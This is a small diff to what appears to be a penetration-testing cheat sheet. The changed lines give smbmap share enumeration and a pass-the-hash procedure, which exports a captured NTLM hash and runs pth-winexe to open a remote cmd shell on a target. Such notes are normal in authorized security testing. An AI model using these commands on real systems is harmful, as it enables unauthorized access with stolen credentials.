@@ -60,9 +60,11 @@ smbmap -H <IP> # to list shares and display read/write permissions.
 **PASS The HASH**
 
 1 .Take the NTLM hash and export it as:
- export SMBHASH=<<<<<<<<<<<<<<NTLM HASH HERE>>>>>>>>>>>>>>>>>>
+
+export SMBHASH=<<<<<<<<<<<<<<NTLM HASH HERE>>>>>>>>>>>>>>>>>>
 
 2. run the command:
+
 pth-winexe -U <USER>% //x.x.x.x cmd
     
     
